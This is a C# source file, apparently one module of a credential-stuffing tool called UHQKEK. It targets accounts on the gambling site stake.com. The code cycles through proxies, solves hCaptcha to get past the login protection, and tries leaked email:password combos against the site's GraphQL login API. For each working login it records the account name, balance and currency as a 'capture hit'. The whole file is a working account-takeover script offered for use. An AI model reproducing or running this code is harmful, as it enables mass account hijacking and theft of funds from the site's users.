using Leaf.xNet;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Capture
{
    class Stake
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());

                string capsol = Captchas.hcapkey("https://stake.com/?tab=login&modal=auth", "7830874c-13ad-4cfe-98d7-e8b019dc1742");
                //Console.WriteLine("CAP:"+capsol);

                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("accept", "*/*");
                //httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "en-US,en;q=0.9,ro-RO;q=0.8,ro;q=0.7");
                httpRequest.AddHeader("content-type", "application/json");
                httpRequest.AddHeader("origin", "https://stake.com");
                httpRequest.AddHeader("referer", "https://stake.com/");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36");
                string str1 = httpRequest.Post("https://api.stake.com/graphql", "{\"query\":\"mutation RequestLoginUser($name: String, $email: String, $password: String!, $captcha: String) {\\n  requestLoginUser(\\n    name: $name\\n    email: $email\\n    password: $password\\n    captcha: $captcha\\n  ) {\\n    loginToken\\n    hasTfaEnabled\\n    requiresLoginCode\\n    user {\\n      id\\n      name\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\",\"operationName\":\"RequestLoginUser\",\"variables\":{\"email\":\"" + strArray1[0] + "\",\"password\":\"" + strArray1[1] + "\",\"captcha\":\"" + capsol + "\"}}", "application/json").ToString();
                dynamic json = JsonConvert.DeserializeObject(str1);
                if (str1.Contains("loginToken"))
                {
                    string token = json["loginToken"];

                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = true;
                    httpRequest.AddHeader("accept", "*/*");
                    httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                    httpRequest.AddHeader("accept-language", "en-US,en;q=0.9,ro-RO;q=0.8,ro;q=0.7");
                    httpRequest.AddHeader("content-type", "application/json");
                    httpRequest.AddHeader("origin", "https://stake.com");
                    httpRequest.AddHeader("referer", "https://stake.com/");
                    httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36");
                    string str2 = httpRequest.Post("https://api.stake.com/graphql", "{\"query\":\"mutation CompleteLoginUser($loginToken: String, $tfaToken: String, $sessionName: String!, $blackbox: String, $loginCode: String) {\\n  completeLoginUser(\\n    loginToken: $loginToken\\n    tfaToken: $tfaToken\\n    sessionName: $sessionName\\n    blackbox: $blackbox\\n    loginCode: $loginCode\\n  ) {\\n    ...UserAuthenticatedSession\\n    __typename\\n  }\\n}\\n\\nfragment UserAuthenticatedSession on UserAuthenticatedSession {\\n  token\\n  session {\\n    ...UserSession\\n    user {\\n      ...UserAuth\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\\nfragment UserSession on UserSession {\\n  id\\n  sessionName\\n  ip\\n  country\\n  city\\n  active\\n  updatedAt\\n}\\n\\nfragment UserAuth on User {\\n  id\\n  name\\n  email\\n  hasPhoneNumberVerified\\n  hasEmailVerified\\n  hasPassword\\n  intercomHash\\n  createdAt\\n  hasTfaEnabled\\n  mixpanelId\\n  hasOauth\\n  isMaxBetEnabled\\n  flags {\\n    flag\\n    __typename\\n  }\\n  signupCode {\\n    code {\\n      code\\n      __typename\\n    }\\n    __typename\\n  }\\n  roles {\\n    name\\n    __typename\\n  }\\n  balances {\\n    ...UserBalance\\n    __typename\\n  }\\n  activeClientSeed {\\n    id\\n    seed\\n    __typename\\n  }\\n  previousServerSeed {\\n    id\\n    seed\\n    __typename\\n  }\\n  activeServerSeed {\\n    id\\n    seedHash\\n    nextSeedHash\\n    nonce\\n    blocked\\n    __typename\\n  }\\n}\\n\\nfragment UserBalance on UserBalance {\\n  available {\\n    amount\\n    currency\\n    __typename\\n  }\\n  vault {\\n    amount\\n    currency\\n    __typename\\n  }\\n}\\n\",\"operationName\":\"CompleteLoginUser\",\"variables\":{\"loginToken\":\"" + token + "\",\"sessionName\":\"Chrome (Unknown)\",\"blackbox\":\"no blackbox\"}}", "application/json").ToString();
                    dynamic json1 = JsonConvert.DeserializeObject(str2);
                    string name = json1["name"];
                    string hasEmailVerified = json1["hasEmailVerified"];
                    string currency = json1["currency"];
                    string amount = json1["amount"];

                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("");
                    }
                    Program.Save(combo + $" | Name: {name} | Balance: {amount} HasEmailVerified: {hasEmailVerified} | Currency: {currency}", "Stake Capture Hits");
                    return true;
                }
                else if (str1.Contains("Please provide a valid password.") || str1.Contains("Password required") || str1.Contains("\"errorType\":\"notFound\""))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }

            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
